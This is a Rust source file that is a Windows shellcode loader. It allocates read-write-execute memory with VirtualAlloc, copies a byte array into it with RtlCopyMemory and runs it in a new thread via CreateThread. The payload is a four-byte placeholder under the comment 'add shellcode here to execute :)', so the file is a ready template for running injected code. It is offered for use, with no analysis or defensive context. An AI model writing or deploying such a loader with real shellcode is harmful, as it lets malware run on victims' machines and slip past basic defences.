use winapi::{um::{winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, RtlCopyMemory}, minwinbase::LPTHREAD_START_ROUTINE}, shared::{minwindef::LPVOID, basetsd::SIZE_T, ntdef::HANDLE}};
use winapi::um::memoryapi;
use winapi::um::processthreadsapi;
use winapi::um::synchapi;
use winapi::um::handleapi;
fn main(){
    //add shellcode here to execute :)
    let shellcode : [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];
    let shellcast: SIZE_T = unsafe {
        std::mem::transmute(shellcode.len())
    };
    let address: LPVOID =
    unsafe {
        memoryapi::VirtualAlloc(
            std::ptr::null_mut(), 
            shellcast, 
            MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE) 
    };
    let shellcode_address: *const winapi::ctypes::c_void = shellcode.as_ptr() as *const winapi::ctypes::c_void;
    unsafe{
        RtlCopyMemory(address, shellcode_address , shellcode.len());
    }
    let thread_start_routine: LPTHREAD_START_ROUTINE = unsafe {
        std::mem::transmute(address)
    };
    let thread_handle: HANDLE;
    unsafe{
        thread_handle = processthreadsapi::CreateThread(
            std::ptr::null_mut(), 
            0, 
            thread_start_routine, 
            std::ptr::null_mut(), 
            0, 
            std::ptr::null_mut());
    };
    let inf = -1i32 as u32;
    unsafe{
        synchapi::WaitForSingleObject(thread_handle,inf);
        handleapi::CloseHandle(thread_handle);
    }
    
    
    


}
//memoryapi::VirtualAlloc(lpAddress, dwSize, 0, flProtect);
//processthreadsapi::CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
//messagebox("Title","Caption");
